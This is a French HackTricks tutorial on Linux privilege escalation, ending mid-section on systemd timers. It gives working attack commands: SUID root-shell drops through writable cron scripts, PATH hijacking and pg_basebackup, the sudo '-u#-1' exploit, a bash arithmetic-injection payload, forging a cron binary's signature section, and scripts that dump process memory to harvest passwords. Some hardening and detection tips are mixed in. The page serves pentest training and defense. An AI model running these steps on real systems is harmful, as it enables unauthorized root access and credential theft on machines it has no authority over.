# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Informations système

### Informations sur l'OS

Commençons par recueillir des informations sur l'OS en cours d'exécution
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Si vous **disposez des permissions d’écriture sur un dossier quelconque du chemin `PATH`**, vous pourriez être en mesure de détourner certaines bibliothèques ou certains binaires :
```bash
echo $PATH
```
### Informations sur l’environnement

Informations intéressantes, mots de passe ou clés API dans les variables d’environnement ?
```bash
(env || set) 2>/dev/null
```
### Exploits du kernel

Vérifiez la version du kernel et déterminez s'il existe un exploit pouvant être utilisé pour élever les privilèges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de kernels vulnérables ainsi que des **exploits compilés** ici : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
D’autres sites où vous pouvez trouver des **exploits compilés** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de kernel vulnérables depuis ce site, vous pouvez utiliser :
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Les outils qui peuvent aider à rechercher des exploits du kernel sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (à exécuter SUR la victime, vérifie uniquement les exploits pour le kernel 2.x)

Recherchez **toujours la version du kernel sur Google**, car votre version du kernel est peut-être mentionnée dans un exploit du kernel, ce qui vous permettra de vous assurer que cet exploit est valide.

Techniques supplémentaires d’exploitation du kernel :

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalade de privilèges Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de Sudo

D’après les versions vulnérables de sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable à l'aide de cette commande grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Les versions de Sudo antérieures à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettent aux utilisateurs locaux non privilégiés d'escalader leurs privilèges jusqu'à root via l'option `--chroot` de sudo lorsque le fichier `/etc/nsswitch.conf` est utilisé depuis un répertoire contrôlé par l'utilisateur.

Voici un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) pour exploiter cette [vulnérabilité](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d'exécuter l'exploit, assurez-vous que votre version de `sudo` est vulnérable et qu'elle prend en charge la fonctionnalité `chroot`.

Pour plus d'informations, consultez l'[avis de vulnérabilité](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) original.

### Contournement des règles Sudo basées sur l'hôte (CVE-2025-32462)

Sudo antérieur à la version 1.9.17p1 (plage affectée signalée : **1.8.8–1.9.17**) peut évaluer les règles sudoers basées sur l'hôte en utilisant le **nom d'hôte fourni par l'utilisateur** via `sudo -h <host>` au lieu du **véritable nom d'hôte**. Si sudoers accorde des privilèges plus larges sur un autre hôte, vous pouvez **spoof** cet hôte localement.

Conditions requises :
- Version vulnérable de sudo
- Règles sudoers spécifiques à l'hôte (l'hôte n'est ni le nom d'hôte actuel ni `ALL`)

Exemple de modèle sudoers :
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploiter en usurpant l’hôte autorisé :
```bash
sudo -h devbox id
sudo -h devbox -i
```
Si la résolution du nom usurpé se bloque, ajoutez-le à `/etc/hosts` ou utilisez un nom d’hôte qui apparaît déjà dans les logs/configs afin d’éviter les recherches DNS.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Échec de la vérification de signature de Dmesg

Consultez la **box smasher2 de HTB** pour un **exemple** de la manière dont cette vuln pourrait être exploitée
```bash
dmesg 2>/dev/null | grep "signature"
```
### Énumération supplémentaire du système
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Énumérer les défenses possibles

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Si vous êtes à l'intérieur d'un container, commencez par la section container-security suivante, puis passez aux pages d'abus spécifiques au runtime :


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Disques

Vérifiez **ce qui est monté et démonté**, où et pourquoi. Si quelque chose est démonté, vous pouvez essayer de le monter et rechercher des informations privées
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Énumérer les binaires utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vérifiez également si **un compilateur est installé**. C'est utile si vous devez utiliser un kernel exploit, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels vulnérables installés

Vérifiez la **version des paquets et services installés**. Il existe peut-être une ancienne version de Nagios, par exemple, qui pourrait être exploitée pour obtenir une élévation de privilèges…\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si vous avez un accès SSH à la machine, vous pouvez également utiliser **openVAS** pour vérifier la présence de logiciels obsolètes et vulnérables installés sur la machine.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d’informations qui seront pour la plupart inutiles. Il est donc recommandé d’utiliser des applications comme OpenVAS ou similaires, qui vérifieront si la version d’un logiciel installé est vulnérable à des exploits connus_

## Processus

Examinez **quels processus** sont exécutés et vérifiez si un processus dispose de **plus de privilèges qu’il ne devrait** (par exemple, un tomcat exécuté par root ?).
```bash
ps aux
ps -ef
top -n 1
```
Vérifiez toujours la présence éventuelle de [**electron/cef/chromium debuggers** en cours d’exécution, car vous pourriez les exploiter pour élever vos privilèges](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en recherchant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez également **vos privilèges sur les binaires des processus** ; vous pourriez peut-être remplacer celui de quelqu’un d’autre.

### Chaînes parent-enfant entre utilisateurs

Un processus enfant exécuté sous un **utilisateur différent** de celui de son parent n’est pas automatiquement malveillant, mais constitue un **signal de triage** utile. Certaines transitions sont attendues (`root` lançant un utilisateur de service, les gestionnaires de connexion créant des processus de session), mais des chaînes inhabituelles peuvent révéler des wrappers, des aides au débogage, de la persistence ou des limites de confiance faibles au niveau du runtime.

Vérification rapide :
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Si vous trouvez une chaîne surprenante, inspectez la ligne de commande du parent ainsi que tous les fichiers qui influencent son comportement (`config`, `EnvironmentFile`, scripts auxiliaires, répertoire de travail, arguments modifiables). Dans plusieurs chemins réels de privesc, le processus enfant lui-même n'était pas modifiable, mais la **configuration contrôlée par le parent** ou la chaîne de scripts auxiliaires l'était.

### Exécutables supprimés et fichiers supprimés mais ouverts

Les artefacts d'exécution restent souvent accessibles **après leur suppression**. Cela est utile à la fois pour l'escalade de privilèges et pour récupérer des preuves depuis un processus qui a déjà ouvert des fichiers sensibles.

Vérifiez les exécutables supprimés :
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Si `/proc/<PID>/exe` pointe vers `(deleted)`, le processus exécute toujours l’ancienne image binaire présente en mémoire. C’est un signal important à examiner, car :

- l’exécutable supprimé peut contenir des chaînes intéressantes ou des identifiants
- le processus en cours d’exécution peut toujours exposer des descripteurs de fichiers utiles
- un binaire privilégié supprimé peut indiquer une altération récente ou une tentative de nettoyage

Collecter globalement les fichiers supprimés mais encore ouverts :
```bash
lsof +L1
```
Si vous trouvez un descripteur intéressant, récupérez-le directement :
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Cela est particulièrement utile lorsqu’un processus a toujours un secret, un script, un export de base de données ou un fichier de flag supprimé ouvert.

### Surveillance des processus

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier des processus vulnérables exécutés fréquemment ou lorsque certaines conditions sont réunies.

### Mémoire des processus

Certains services d’un serveur enregistrent des **identifiants en texte clair dans la mémoire**.\
Normalement, vous aurez besoin des **privilèges root** pour lire la mémoire des processus appartenant à d’autres utilisateurs. Cette méthode est donc généralement plus utile lorsque vous êtes déjà root et souhaitez découvrir d’autres identifiants.\
Cependant, n’oubliez pas qu’**en tant qu’utilisateur standard, vous pouvez lire la mémoire des processus qui vous appartiennent**.

> [!WARNING]
> Notez qu’aujourd’hui, la plupart des machines **n’autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas dumper les autres processus appartenant à votre utilisateur non privilégié.
>
> Le fichier _**/proc/sys/kernel/yama/ptrace_scope**_ contrôle l’accessibilité de ptrace :
>
> - **kernel.yama.ptrace_scope = 0**: tous les processus peuvent être débogués, à condition qu’ils aient le même uid. Il s’agit du fonctionnement classique de ptrace.
> - **kernel.yama.ptrace_scope = 1**: seul un processus parent peut être débogué.
> - **kernel.yama.ptrace_scope = 2**: seul un administrateur peut utiliser ptrace, car la capability CAP_SYS_PTRACE est requise.
> - **kernel.yama.ptrace_scope = 3**: aucun processus ne peut être tracé avec ptrace. Une fois cette valeur définie, un redémarrage est nécessaire pour réactiver ptrace.

#### GDB

Si vous avez accès à la mémoire d’un service FTP, par exemple, vous pourriez récupérer le Heap et y rechercher ses identifiants.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Pour un ID de processus donné, **maps indique comment la mémoire est mappée dans l'espace d'adressage virtuel de ce processus** ; il indique également les **permissions de chaque région mappée**. Le **fichier pseudo mem expose directement la mémoire du processus**. À partir du fichier **maps**, nous savons quelles **régions mémoire sont lisibles** ainsi que leurs offsets. Nous utilisons ces informations pour **nous positionner dans le fichier mem et extraire toutes les régions lisibles** dans un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` permet d'accéder à la mémoire **physique** du système, et non à la mémoire virtuelle. L'espace d'adresses virtuelles du noyau est accessible via /dev/kmem.\
En général, `/dev/mem` est uniquement lisible par **root** et le groupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for Linux

ProcDump est une réimplémentation Linux de l'outil classique ProcDump de la suite d'outils Sysinternals pour Windows. Obtenez-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Outils

Pour dumper la mémoire d’un processus, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences root et dumper le processus qui vous appartient
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root est requis)

### Identifiants depuis la mémoire d’un processus

#### Exemple manuel

Si vous constatez que le processus authenticator est en cours d’exécution :
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez dumper le processus (consultez les sections précédentes pour trouver différentes façons de dumper la mémoire d’un processus) et rechercher des identifiants dans la mémoire :
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et certains **fichiers bien connus**. Il nécessite les privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus     |
| ------------------------------------------------- | -------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (connexions FTP actives)                   | vsftpd               |
| Apache2 (sessions HTTP Basic Auth actives)        | apache2              |
| OpenSSH (sessions SSH actives - utilisation de Sudo) | sshd:                |

#### Regexes de recherche/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tâches Scheduled/Cron

### Crontab UI (alseambusher) exécuté en tant que root – privesc via un scheduler web

Si un panneau web « Crontab UI » (alseambusher/crontab-ui) s’exécute en tant que root et est uniquement lié à loopback, vous pouvez tout de même y accéder via une redirection de port locale SSH et créer une tâche privilégiée pour effectuer une escalation de privilèges.

Chaîne typique
- Découvrir le port limité à loopback (par exemple, 127.0.0.1:8000) et le realm Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Trouver les identifiants dans les artefacts opérationnels :
- Backups/scripts avec `zip -P <password>`
- unité systemd exposant `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Établir le tunnel et se connecter :
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créer une tâche avec des privilèges élevés et l’exécuter immédiatement (dépose un shell SUID) :
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le :
```bash
/tmp/rootshell -p   # root shell
```
Durcissement
- N’exécutez pas Crontab UI en tant que root ; limitez-le avec un utilisateur dédié et des permissions minimales
- Liez-le à localhost et restreignez en plus l’accès via un firewall/VPN ; ne réutilisez pas les mots de passe
- Évitez d’intégrer des secrets dans les unit files ; utilisez des secret stores ou un EnvironmentFile accessible uniquement par root
- Activez l’audit/la journalisation des exécutions de jobs à la demande



Vérifiez si un job planifié est vulnérable. Vous pouvez peut-être tirer parti de l’exécution d’un script par root (vulnérabilité des wildcards ? Pouvez-vous modifier des fichiers utilisés par root ? Utiliser des symlinks ? Créer des fichiers spécifiques dans le répertoire utilisé par root ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Si `run-parts` est utilisé, vérifiez quels noms seront réellement exécutés :
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Cela évite les faux positifs. Un répertoire périodique accessible en écriture n'est utile que si le nom de fichier de votre payload correspond aux règles locales de `run-parts`.

### Chemin Cron

Par exemple, dans _/etc/crontab_, vous pouvez trouver le PATH : _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Notez que l'utilisateur « user » dispose de privilèges d'écriture sur /home/user_)

Si, dans cette crontab, l'utilisateur root tente d'exécuter une commande ou un script sans définir le path. Par exemple : _\* \* \* \* root overwrite.sh_\
Alors, vous pouvez obtenir un shell root en utilisant :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilisant un script avec un wildcard (Wildcard Injection)

Si un script exécuté par root contient un « **\*** » dans une commande, vous pouvez exploiter cela pour provoquer des actions inattendues (comme une privesc). Exemple :
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si le wildcard est précédé d'un chemin comme** _**/some/path/\***_ **, il n'est pas vulnérable (même** _**./\***_ **ne l'est pas).**

Lisez la page suivante pour découvrir d'autres astuces d'exploitation des wildcards :


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injection par expansion arithmétique Bash dans les analyseurs de logs cron

Bash effectue l'expansion des paramètres et la substitution de commandes avant l'évaluation arithmétique dans ((...)), $((...)) et let. Si un cron/parser exécuté en tant que root lit des champs de logs non fiables et les transmet à un contexte arithmétique, un attaquant peut injecter une substitution de commande $(...) qui s'exécutera en tant que root lors de l'exécution du cron.

- Pourquoi cela fonctionne : Dans Bash, les expansions se produisent dans cet ordre : expansion des paramètres/variables, substitution de commandes, expansion arithmétique, puis séparation des mots et expansion des chemins. Ainsi, une valeur comme `$(/bin/bash -c 'id > /tmp/pwn')0` est d'abord substituée (ce qui exécute la commande), puis le `0` numérique restant est utilisé pour le calcul arithmétique afin que le script continue sans erreur.

- Schéma vulnérable typique :
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation : Faites écrire dans le log analysé un texte contrôlé par l'attaquant, de sorte que le champ d'apparence numérique contienne une substitution de commande et se termine par un chiffre. Assurez-vous que votre commande n'affiche rien sur stdout (ou redirigez cette sortie) afin que l'expression arithmétique reste valide.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Réécriture de scripts cron et symlink

Si vous **pouvez modifier un script cron** exécuté par root, vous pouvez obtenir un shell très facilement :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire auquel vous avez un accès total**, il pourrait être utile de supprimer ce dossier et de **créer un dossier symlinké vers un autre dossier** contenant un script que vous contrôlez.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validation des liens symboliques et gestion plus sûre des fichiers

Lors de l'examen de scripts/binaires privilégiés qui lisent ou écrivent des fichiers via un chemin, vérifiez comment les liens sont gérés :

- `stat()` suit un lien symbolique et renvoie les métadonnées de la cible.
- `lstat()` renvoie les métadonnées du lien lui-même.
- `readlink -f` et `namei -l` permettent de résoudre la cible finale et d'afficher les permissions de chaque composant du chemin.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Pour les defenders/developers, les patterns plus sûrs contre les symlink tricks incluent :

- `O_EXCL` avec `O_CREAT` : échoue si le chemin existe déjà (bloque les links/files précréés par l’attaquant).
- `openat()` : opère relativement à un file descriptor de répertoire de confiance.
- `mkstemp()` : crée des fichiers temporaires de manière atomique avec des permissions sécurisées.

### Custom-signed cron binaries avec des payloads inscriptibles

Les blue teams « signent » parfois les binaries déclenchés par cron en extrayant une section ELF personnalisée et en recherchant une chaîne du vendor avant de les exécuter en tant que root. Si ce binary est accessible en écriture pour le groupe (par exemple, `/opt/AV/periodic-checks/monitor` appartenant à `root:devs 770`) et que vous pouvez leak le matériel de signature, vous pouvez forger la section et hijack la tâche cron :

1. Utilisez `pspy` pour capturer le flow de vérification. Dans Era, root exécutait `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, suivi de `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, puis exécutait le fichier.
2. Recréez le certificat attendu avec la key/config leakées (depuis `signing.zip`) :
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Construisez un remplacement malicious (par exemple, déposer un SUID bash ou ajouter votre SSH key) et intégrez le certificat dans `.text_sig` pour que le grep réussisse :
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Écrasez le binary planifié tout en préservant les execute bits :
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Attendez la prochaine exécution de cron ; une fois la vérification naïve de la signature réussie, votre payload s’exécute en tant que root.

### Frequent cron jobs

Vous pouvez monitorer les process afin de rechercher ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Vous pouvez peut-être en tirer parti pour escalade de privileges.

Par exemple, pour **monitorer toutes les 0,1 s pendant 1 minute**, **trier par commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus souvent, vous pouvez utiliser :
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez également utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela surveillera et listera chaque processus qui démarre).

### Backups root qui préservent les bits de mode définis par l’attaquant (pg_basebackup)

Si un cron appartenant à root exécute `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données dans lequel vous pouvez écrire, vous pouvez y placer un **binaire SUID/SGID** qui sera recopié en tant que **root:root**, avec les mêmes bits de mode, dans la sortie du backup.

Flux de découverte typique (en tant qu’utilisateur DB peu privilégié) :
- Utilisez `pspy` pour repérer un cron root appelant quelque chose comme `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` chaque minute.
- Confirmez que le cluster source (par exemple, `/var/lib/postgresql/14/main`) est accessible en écriture pour vous et que la destination (`/opt/backups/current`) devient la propriété de root après l’exécution de la tâche.

Exploit :
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Cela fonctionne parce que `pg_basebackup` préserve les bits de mode des fichiers lors de la copie du cluster ; lorsqu'il est exécuté par root, les fichiers de destination héritent de la **propriété de root + des bits SUID/SGID choisis par l'attaquant**. Toute routine de backup/copie privilégiée similaire qui conserve les permissions et écrit dans un emplacement exécutable est vulnérable.

### Tâches cron invisibles

Il est possible de créer une tâche cron **en plaçant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et la tâche cron fonctionnera. Exemple (notez le caractère de retour chariot) :
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Pour détecter ce type d'entrée furtive, inspectez les fichiers cron à l'aide d'outils qui affichent les caractères de contrôle :
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Fichiers _.service_ inscriptibles

Vérifiez si vous pouvez écrire dans un fichier `.service` ; si c’est le cas, vous **pourriez le modifier** afin qu’il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (vous devrez peut-être attendre le redémarrage de la machine).\
Par exemple, créez votre backdoor dans le fichier `.service` avec **`ExecStart=/tmp/script.sh`**

### Binaires de services inscriptibles

Gardez à l’esprit que si vous avez des **permissions d’écriture sur les binaires exécutés par les services**, vous pouvez les modifier pour y placer des backdoors ; ainsi, lorsque les services seront réexécutés, les backdoors seront exécutées.

### systemd PATH - Chemins relatifs

Vous pouvez voir le PATH utilisé par **systemd** avec :
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **écrire** dans l’un des dossiers du chemin, vous pourrez peut-être effectuer une **élévation de privilèges**. Vous devez rechercher les **chemins relatifs utilisés dans les fichiers de configuration des services**, comme :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** portant le **même nom que le binaire du chemin relatif** dans le dossier du PATH de systemd dans lequel vous pouvez écrire. Lorsque le service doit exécuter l’action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer ou arrêter les services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**Pour en savoir plus sur les services, consultez `man systemd.service`.**

## **Timers**

Les **Timers** sont des fichiers unit systemd dont le nom se termine par `**.timer**` et qui contrôlent des fichiers `**.service**` ou des événements. Les **Timers** peuvent être utilisés comme alternative à cron, car ils prennent nativement en charge les événements temporels calendaires et monotones et peuvent être exécutés de manière asynchrone.

Vous pouvez énumérer tous les timers avec :
```bash
systemctl list-timers --all
```
### Timers accessibles en écriture

Si vous pouvez modifier un timer, vous pouvez lui faire exécuter certaines unités existantes de systemd.unit (comme un `.service` ou une `.target`).
```bash
Unit=backdoor.service
```
Dans la documentation, vous pouvez lire ce qu’est l’Unit :

> L’unité à activer lorsque ce timer arrive à échéance. L’argument est un nom d’unité dont le suffixe n’est pas ".timer". S’il n’est pas spécifié, cette valeur correspond par défaut à un service portant le même nom que l’unité timer, à l’exception du suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l’unité activée et celui de l’unité timer soient identiques, à l’exception du suffixe.

Par conséquent, pour exploiter cette permission, vous devez :

- Trouver une unité systemd (comme un `.service`) qui **exécute un binaire accessible en écriture**
